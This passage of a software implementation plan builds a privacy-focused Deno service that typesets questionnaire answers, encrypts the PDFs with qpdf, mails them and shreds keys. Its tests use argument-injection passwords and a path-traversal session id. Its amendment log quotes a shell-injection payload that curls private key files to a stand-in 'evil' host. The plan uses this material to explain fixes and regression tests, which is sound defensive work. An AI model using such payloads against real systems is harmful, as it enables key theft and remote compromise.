  const typPath = `${workDir}/template.typ`;
  const outPath = `${workDir}/out.pdf`;

  try {
    // 0600 and inside the tmpfs workDir. Nothing sensitive goes on argv --
    // see the note in template.typ for why that mattered.
    await Deno.writeTextFile(dataPath, JSON.stringify(doc), { mode: 0o600 });
    // Copied in so --root can be the workDir alone: Typst refuses to read
    // outside its root, and the root must contain both template and data.
    await Deno.copyFile(TEMPLATE, typPath);

    const res = await new Deno.Command('typst', {
      args: ['compile', '--root', workDir, typPath, outPath],
      stdout: 'null',
      // Discarded rather than captured: Typst echoes source context on failure,
      // which for this template means answer text.
      stderr: 'null',
    }).output();
    if (!res.success) throw new Error('typst render failed');

    return await Deno.readFile(outPath);
  } finally {
    // Runs on every path. A thrown render previously left decrypted JSON behind
    // in the working directory for whatever cleaned up next.
    for (const p of [dataPath, typPath, outPath]) {
      await Deno.remove(p).catch(() => {});
    }
  }
}
```

- [ ] **Step 5: Run tests**

Run: `deno test --allow-read --allow-write --allow-run romania/tests/render_test.ts`
Expected: PASS, 2 tests.

- [ ] **Step 6: Inspect the output by eye**

Render the fixture, open the PDF, and confirm Tamil conjuncts are shaped
correctly rather than shown as separate or dotted-circle glyphs. **No automated
test catches broken shaping.**

- [ ] **Step 7: Commit**

```bash
deno fmt romania/render.ts romania/tests/render_test.ts
git add romania/render.ts romania/template.typ romania/tests/render_test.ts
git commit -m "feat(romania): typeset the questionnaire PDF with Typst"
```

---

## Task 12: PDF password protection

**Files:**

- Create: `romania/protect.ts`
- Test: `romania/tests/protect_test.ts` (create)

**Interfaces:**

- Consumes: `renderPdf` output (Task 11)
- Produces: `protectPdf(pdf: Uint8Array, password: string, workDir: string): Promise<Uint8Array>` — AES-256, user password, verified openable before returning. Throws on any failure; **never returns the unprotected input.**

- [ ] **Step 0: Pin qpdf and confirm its flag syntax**

qpdf was not installed on the authoring machine, so the three flags this task
depends on are unverified. Confirm all of them before writing code — the
`--encrypt` syntax changed in qpdf 11.7, and older builds take the password
positionally, which is exactly the argv exposure being fixed:

```bash
qpdf --version                                   # 11.7+ required; pin it
qpdf --help=encryption | grep -E 'user-password|bits'
qpdf --help=usage      | grep -E 'password-file|@filename'
```

If `--password-file=-` is unavailable in the pinned build, the fallback is a
`0600` file path rather than `-`. Do **not** fall back to putting it on argv.

- [ ] **Step 1: Write the failing test**

```ts
// romania/tests/protect_test.ts
import { assert, assertEquals, assertRejects } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { protectPdf } from '../protect.ts';
import { renderPdf } from '../render.ts';

const doc = {
  entries: [{
    index: 0,
    tamilNumeral: '௧',
    tamil: 'கேள்வி',
    transliteration: 'kēḷvi',
    english: 'What is your idea of perfect happiness?',
    answer: 'A quiet room.',
    skipped: false,
  }],
};

async function opens(pdf: Uint8Array, password: string | null): Promise<boolean> {
  const dir = await Deno.makeTempDir();
  const p = `${dir}/in.pdf`;
  await Deno.writeFile(p, pdf);
  const args = ['--check', p];
  if (password !== null) args.unshift(`--password=${password}`);
  const res = await new Deno.Command('qpdf', { args, stdout: 'null', stderr: 'null' }).output();
  return res.success;
}

Deno.test('protectPdf - encrypted PDF opens with the password', async () => {
  const dir = await Deno.makeTempDir();
  const pdf = await protectPdf(await renderPdf(doc, dir), 'correct horse battery', dir);
  assert(await opens(pdf, 'correct horse battery'));
});

Deno.test('protectPdf - encrypted PDF does NOT open without the password', async () => {
  const dir = await Deno.makeTempDir();
  const pdf = await protectPdf(await renderPdf(doc, dir), 'correct horse battery', dir);
  assertEquals(await opens(pdf, null), false, 'a passwordless open must fail');
});

Deno.test('protectPdf - refuses an empty password rather than emitting plaintext', async () => {
  const dir = await Deno.makeTempDir();
  const plain = await renderPdf(doc, dir);
  await assertRejects(() => protectPdf(plain, '', dir), Error, 'empty password');
});

// The @argfile is one argument per line. A newline in the password injects
// qpdf arguments; \r is included because qpdf trims CR and a CRLF password
// would otherwise split too.
for (const [name, pw] of [['LF', 'a\n--decrypt'], ['CR', 'a\r--decrypt'], ['CRLF', 'a\r\n--decrypt']]) {
  Deno.test(`protectPdf - refuses a password containing ${name}`, async () => {
    const dir = await Deno.makeTempDir();
    const plain = await renderPdf(doc, dir);
    await assertRejects(() => protectPdf(plain, pw, dir), Error, 'line separator');
  });
}

Deno.test('protectPdf - leaves no plaintext behind when it refuses', async () => {
  const dir = await Deno.makeTempDir();
  const plain = await renderPdf(doc, dir);
  await assertRejects(() => protectPdf(plain, 'a\n--decrypt', dir));

  // The decrypted PDF and the argfile must not survive a rejected call.
  for await (const entry of Deno.readDir(dir)) {
    assert(entry.name !== 'plain.pdf', 'decrypted PDF left in the working directory');
    assert(entry.name !== 'qpdf.args', 'argument file left in the working directory');
  }
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-read --allow-write --allow-run romania/tests/protect_test.ts`
Expected: FAIL — `romania/protect.ts` does not exist.

- [ ] **Step 3: Implement**

```ts
// romania/protect.ts
/**
 * AES-256 PDF encryption via qpdf.
 *
 * The *user* password is set (both positional arguments), not merely an owner
 * password: owner passwords only set permission flags that any tool strips, and
 * would give the respondent confidentiality they do not actually have.
 *
 * The result is verified openable before it is returned. PDF password encoding
 * is genuinely treacherous -- R6 expects UTF-8 with SASLprep, older handlers
 * used PDFDocEncoding, and readers disagree -- so a password containing an
 * emoji or a Tamil character can encrypt cleanly and then refuse to open.
 *
 * Every failure path throws. This function must never return the unprotected
 * input: mailing an unencrypted PDF to someone who asked for a password is the
 * single worst outcome available to this system.
 */
export async function protectPdf(pdf: Uint8Array, password: string, workDir: string): Promise<Uint8Array> {
  if (password.length === 0) throw new Error('empty password');

  // AMENDED 2026-08-11. The @argfile format is ONE ARGUMENT PER LINE, so a
  // password containing a newline does not merely corrupt the file -- it
  // injects additional qpdf arguments. Moving the password off argv to fix an
  // information leak introduced an injection vector in the same edit, which is
  // its own lesson: a replacement that is "obviously safer" earns the same
  // scrutiny as the thing it replaced.
  //
  // Rejected rather than stripped or escaped: the argfile format has no
  // escaping, and silently altering someone's password would produce a PDF
  // that does not open with what they typed.
  if (/[\r\n]/.test(password)) throw new Error('password contains a line separator');

  const inPath = `${workDir}/plain.pdf`;
  const outPath = `${workDir}/protected.pdf`;
  const argPath = `${workDir}/qpdf.args`;

  try {
    await Deno.writeFile(inPath, pdf, { mode: 0o600 });

    // AMENDED 2026-08-11: the password used to be an argv element, readable in
    // /proc/<pid>/cmdline by any local user. Mailing a password-protected PDF
    // while publishing the password to the process table protects nobody.
    //
    // qpdf reads an @argfile, one argument per line, so the password reaches it
    // through a 0600 file instead. Both files live on the tmpfs workDir.
    const args = [
      '--encrypt',
      `--user-password=${password}`,
      `--owner-password=${password}`,
      '--bits=256',
      '--',
      inPath,
      outPath,
    ].join('\n');
    await Deno.writeTextFile(argPath, args, { mode: 0o600 });

    const enc = await new Deno.Command('qpdf', {
      args: [`@${argPath}`],
      stdout: 'null',
      stderr: 'null',
    }).output();
    if (!enc.success) throw new Error('qpdf encryption failed');

    // Same reasoning for the verification pass: --password-file=- takes it on
    // stdin, keeping it off argv here too.
    const checkChild = new Deno.Command('qpdf', {
      args: ['--password-file=-', '--check', outPath],
      stdin: 'piped',
      stdout: 'null',
      stderr: 'null',
    }).spawn();
    const w = checkChild.stdin.getWriter();
    await w.write(new TextEncoder().encode(password));
    await w.close();
    const check = await checkChild.output();
    if (!check.success) throw new Error('encrypted pdf failed its round-trip check');

    return await Deno.readFile(outPath);
  } finally {
    // Every path, including the throws above. A failed encryption previously
    // left plain.pdf -- the fully decrypted document -- sitting in workDir.
    for (const p of [inPath, argPath, outPath]) {
      await Deno.remove(p).catch(() => {});
    }
  }
}
```

- [ ] **Step 4: Run tests**

Run: `deno test --allow-read --allow-write --allow-run romania/tests/protect_test.ts`
Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
deno fmt romania/protect.ts romania/tests/protect_test.ts
git add romania/protect.ts romania/tests/protect_test.ts
git commit -m "feat(romania): AES-256 PDF protection with verified round-trip"
```

---

## Task 13: Email attachments

**Files:**

- Modify: `lib/email.ts`
- Test: `tests/email_attachment_test.ts` (create)

**Interfaces:**

- Produces: `SendEmailOptions.attachments?: Array<{ filename: string; content: Uint8Array; contentType: string }>`

**Verify first:** denomailer 1.6.0's attachment shape is unconfirmed. Read
`https://deno.land/x/denomailer@1.6.0/mod.ts` and match its actual API before
writing the adapter; do not assume the field names above map directly.

- [ ] **Step 1: Confirm the denomailer attachment API**

Run: `deno doc https://deno.land/x/denomailer@1.6.0/mod.ts | grep -iA5 attach`
Record the exact shape it expects.

- [ ] **Step 2: Write the failing test**

```ts
// tests/email_attachment_test.ts
import { assertEquals } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { toDenomailerAttachments } from '../lib/email.ts';

Deno.test('toDenomailerAttachments - maps a PDF to denomailer shape', () => {
  const bytes = new Uint8Array([0x25, 0x50, 0x44, 0x46]);
  const [a] = toDenomailerAttachments([
    { filename: 'responses.pdf', content: bytes, contentType: 'application/pdf' },
  ]);
  assertEquals(a.filename, 'responses.pdf');
  assertEquals(a.contentType, 'application/pdf');
});

Deno.test('toDenomailerAttachments - empty list maps to empty list', () => {
  assertEquals(toDenomailerAttachments([]).length, 0);
});
```

- [ ] **Step 3: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env tests/email_attachment_test.ts`
Expected: FAIL — `toDenomailerAttachments` is not exported.

- [ ] **Step 4: Implement**

Add the exported mapper and extend `SendEmailOptions` with `attachments?`, then
pass the mapped array into the `client.send(...)` call. Keep the existing
`smtpReplyCode` / `smtpFailureKind` error handling untouched.

- [ ] **Step 5: Run tests**

Run: `deno test --allow-net --allow-read --allow-env tests/email_attachment_test.ts && deno check main.ts`
Expected: PASS, 2 tests.

- [ ] **Step 6: Commit**

```bash
deno fmt lib/email.ts tests/email_attachment_test.ts
git add lib/email.ts tests/email_attachment_test.ts
git commit -m "feat(email): binary attachment support"
```

---

## Task 14: Romania render service and deployment

**Files:**

- Create: `romania/render-service.ts`
- Create: `romania/deploy/render.service`, `romania/deploy/shred.timer`, `romania/deploy/shred.service`, `romania/deploy/README.md`
- Test: `romania/tests/service_test.ts` (create)

**Interfaces:**

- Consumes: Tasks 10-13
- Produces: `POST /render` accepting a `DeliveryBundle`, bound to the mesh address only.

- [ ] **Step 1: Write the failing test**

```ts
// romania/tests/service_test.ts
import { assertEquals } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { validateBundle } from '../render-service.ts';

Deno.test('validateBundle - accepts a well-formed bundle', () => {
  assertEquals(
    validateBundle({
      sessionId: '11111111-2222-3333-4444-555555555555',
      answers: [{ questionIndex: 0, questionText: 'q', ciphertext: 'ct', skipped: false }],
      encryptedEmail: 'enc',
      encryptedPassword: null,
    }),
    'ok',
  );
});

Deno.test('validateBundle - rejects a bundle with no answers', () => {
  assertEquals(
    validateBundle({
      sessionId: '11111111-2222-3333-4444-555555555555',
      answers: [],
      encryptedEmail: 'enc',
      encryptedPassword: null,
    }),
    'no answers',
  );
});

Deno.test('validateBundle - rejects a traversal-shaped session id', () => {
  assertEquals(
    validateBundle({
      sessionId: '../../etc/passwd',
      answers: [{ questionIndex: 0, questionText: 'q', ciphertext: 'ct', skipped: false }],
      encryptedEmail: 'enc',
      encryptedPassword: null,
    }),
    'bad session id',
  );
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-read romania/tests/service_test.ts`
Expected: FAIL — `validateBundle` is not exported.

- [ ] **Step 3: Implement the service**

`validateBundle` returns `'ok'` or a reason string. It must require **exactly 35
answers with indices 0-34 in canonical order** — the same guarantee `buildBundle`
now makes on the Iceland side. Checking it again at the Romania boundary is not
redundant: Romania accepts bundles over the network, and a short or reordered
one would otherwise render as a plausible-looking but wrong document.

The handler then loads the identity and decrypts — but **not unconditionally**:

```ts
// AMENDED 2026-08-11: buildBundle synthesizes gaps as { ciphertext: '',
// skipped: true }, so decrypting every entry would hand age an empty string
// and fail the whole render for a question the respondent simply never reached.
const entries = await Promise.all(bundle.answers.map(async (a) => ({
  ...canonicalQuestion(a.questionIndex),
  skipped: a.skipped,
  answer: a.skipped || a.ciphertext === '' ? '' : await decrypt(a.ciphertext, identity),
})));
```

Then: render, protect when a password was supplied, mail with the PDF attached,
call Iceland back to set `pdf_delivered_at`, and unlink the tmpfs working
directory in a `finally` block so plaintext never outlives the request.

**Do not shred the key here.** The 7-day timer owns that.

- [ ] **Step 4: Write the deployment units**

`render.service` binds to the WireGuard address only. `shred.timer` runs daily
and invokes `shredExpired(dir, new Date(), { afterDelivery: 7, absolute: 30 })`.
The service calls `markDelivered(dir, sessionId, new Date())` on the first
successful SMTP send and never again — that marker, not the file's mtime, is
what starts the 7-day clock. The README documents the egress
policy — allow `tcp/587` to `smtp.mail.me.com` and the mesh, deny everything
else — and the tmpfs mount for the working directory.

- [ ] **Step 5: Run tests**

Run: `deno test --allow-read romania/tests/service_test.ts`
Expected: PASS, 3 tests.

- [ ] **Step 6: Commit**

```bash
deno fmt romania/
git add romania/
git commit -m "feat(romania): mesh-bound render service with 7-day key shredding"
```

---

## Task 15: Correct the privacy copy and vendor the Tamil font

**Files:**

- Modify: `routes/privacy.tsx` (lines 46-47, 50, 80-81), `routes/index.tsx` (lines 14-18)
- Modify: `FONTS.md`
- Add: `public/fonts/NotoSansTamil-Regular.ttf`
- Test: `routes/privacy_test.tsx` (existing — extend)

This task is **not optional and not deferrable.** Until it lands, the site makes
a claim about respondents' data that the rest of this plan has made false.

- [ ] **Step 1: Write the failing test**

```tsx
// add to routes/privacy_test.tsx
Deno.test('privacy - does not claim the address is never stored', () => {
  const html = render(<PrivacyPage />);
  assert(!html.includes('the address itself is never stored'));
  assert(!html.includes('Never stored as an address'));
});

Deno.test('privacy - describes the split-key storage truthfully', () => {
  const html = render(<PrivacyPage />);
  assertStringIncludes(html, 'encrypted');
  assertStringIncludes(html, 'separate server');
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env routes/privacy_test.tsx`
Expected: FAIL — the old claims are still present.

- [ ] **Step 3: Rewrite the copy**

Replace the "Never stored as an address" claim with an accurate description:
the address is kept encrypted to a key held on a separate server, is unreadable
on the machine that stores it, and is used only to send a copy of the responses
when asked. Apply the same correction to the header comment in
`routes/index.tsx:14-18`.

**AMENDED 2026-08-11 — do not write "destroyed with the session key."** That was
the original wording here and it is false. `encrypted_email` is encrypted to
_two_ recipients, and the break-glass key is the second. Shredding the session
key on day 7 ends routine access; it does not end all access, and the ciphertext
stays in Postgres until the row is deleted.

Correcting one false statement with another is worse than leaving the first: it
launders the inaccuracy through a change that looks like diligence. Say what is
true — routine access ends when the session key is shredded, the row is removed
on a deletion request, and one offline key retained for recovery can still open
it until then. If that sentence feels uncomfortable to publish, the objection is
to the design, not to the wording, and it should be raised as such.

The same care applies to the deletion claim on `/privacy:141`: verify it against
what `forget.ts` actually does across all three systems before leaving it in
place.

- [ ] **Step 4: Vendor the font**

Download Noto Sans Tamil, place it at `public/fonts/NotoSansTamil-Regular.ttf`,
and move its row in `FONTS.md` from "Fonts To Download" to the tracked table.
Confirm `.gitignore` does not exclude the file.

- [ ] **Step 5: Run the full suite**

Run: `deno task test && ./scripts/check-zero-logging.sh && ./scripts/check-secrets.sh`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
deno fmt routes/privacy.tsx routes/index.tsx
git add routes/privacy.tsx routes/index.tsx routes/privacy_test.tsx FONTS.md public/fonts/NotoSansTamil-Regular.ttf
git commit -m "docs(privacy): describe encrypted address storage truthfully"
```

---

## Amendment log — 2026-08-11 (execution session 1)

Tasks 1-3 are implemented and committed. Amendments made during execution:

**Defects found by review, fixed in the plan above:**

1. **Task 6's test broke its whole module.** `recipientsForSession` throws
   synchronously; `assertRejects(() => Promise.resolve(...))` therefore threw
   before the promise existed, and the un-awaited assertion escaped the test.
   Verified against std 0.208: uncaught error, sibling tests cancelled. Now
   `assertThrows`.
2. **Task 7's CSS reveal could never fire.** The radio was nested inside its
   `<label>`, so `.consent-yes:checked ~ .pw-panel` had no matching sibling. On
   the no-JS path this means no password field, ever. Input hoisted out.
3. **Task 7's test contradicted Task 7's markup** — `!html.includes('required')`
   over the whole form, which both radios violate by design. Now scoped to the
   password input.
4. **Task 2 bounded the recipient list after parsing it.** Moved above the parse
   loop; a limit that runs after the expensive work protects nothing.

**Found during implementation, not predicted by the plan:**

5. **COMMAND INJECTION in the Task 3 transport (fixed).** The plan's
   `scpTransport` interpolated `sessionId` straight into ssh's remote-command
   argument. `new Deno.Command('ssh', { args: [...] })` spawns no local shell, so
   the array form reads as safe — and locally it is — but sshd concatenates its
   arguments and hands the result to the remote login shell. A session id of
   `x; curl http://evil/$(cat /var/lib/romania/keys/*.key); #` would therefore
   execute on the single box holding every respondent's private key: total
   compromise of the property the whole design exists to protect.

   Not reachable today (Task 5, the only caller, is unwritten and passes
   `crypto.randomUUID()`), but `pushIdentity` is exported with an unvalidated
   `sessionId: string` and would have been a live hole the moment Task 5 landed.
   Notably the plan already validated this exact value on the _Romania_ side
   (Task 10's `SESSION_ID`) — the end that merely writes a filename got the
   guard, while the end that builds a shell command did not.

   Fixed with an allowlist matching Romania's charset exactly, enforced at both
   `pushIdentity` (every transport) and `scpTransport` (which does not delegate
   its own safety), plus quoting as belt-and-braces. Seven hostile ids are
   regression-tested, asserting the transport never runs — not merely that the
   call rejects.

6. **`clippy --all-targets` catches what `cargo test` cannot.** Replacing
   `iter::once(recipient)` with `refs.into_iter()` left `std::iter` unused in the
   _bin_ target while the test module still needed it. `cargo test` compiles the
   test cfg and stayed green. Import scoped into `mod tests`.

**BLOCKER for Task 5 and Task 15.** Both specify `deno task test` → PASS, which
is currently impossible: `tests/integration_test.ts` fails type-check with 12
`TS2345` errors (`Uint8Array<ArrayBufferLike>` vs `Uint8Array<ArrayBuffer>`, from
TypeScript 5.7 making `Uint8Array` generic over its backing buffer). **Verified
pre-existing** — identical 12 errors at `a1837e3`, before any work here. Unrelated
to this feature, but it must be fixed or those gates can never go green.

**Decisions taken (2026-08-11):**

- **Break-glass custody:** keypair generated; recipient is
  `age1f93924ka5fkrmnr5lunexq20wezslnguyqy6tzjarg8d2ec47gtqyycjn8`. The identity
  was handed to the operator and is **not** stored in this repo, on Iceland, or
  in any log. Set it as `BREAKGLASS_AGE_RECIPIENT` before Task 5 runs.
- **Romania unreachable:** build a real durable queue (new **Task 8b**) rather
  than reporting success for mail that never went out.
- **Task 12 open concern (not yet actioned):** `qpdf --encrypt <pw> <pw> 256`
  puts the PDF password in `argv`, readable from `/proc/<pid>/cmdline` by any
  local user. Confirm the qpdf version on the Romania box and prefer stdin-based
  password passing before implementing Task 12.

## Self-review notes

**Spec coverage.** Every numbered decision in the spec maps to a task: per-session
keypairs (3, 5), two recipients (1, 2, 6), key transport (3), Iceland-pushes-bundle
(8), Typst (11), qpdf AES-256 (12), Romania sends mail (13, 14), 7-day shred (10, 14),
optional password (7, 8, 12), re-send link (9), canonical ordering (8), consent and
deletion (7, 9), schema (4), copy correction and font (15).

**Deliberately deferred to execution.** Break-glass key _custody_ — generation
ceremony, storage medium, and the procedure for using it — is named in the spec as
an open gap and is not solved by any task here. `BREAKGLASS_AGE_RECIPIENT` must
exist before Task 5 runs, but where its identity lives is an operational decision
that has to be made by a person, not a plan.

**Known unverified assumption.** Task 13 depends on denomailer 1.6.0's attachment
API, which is why its first step is to read the API rather than write code.
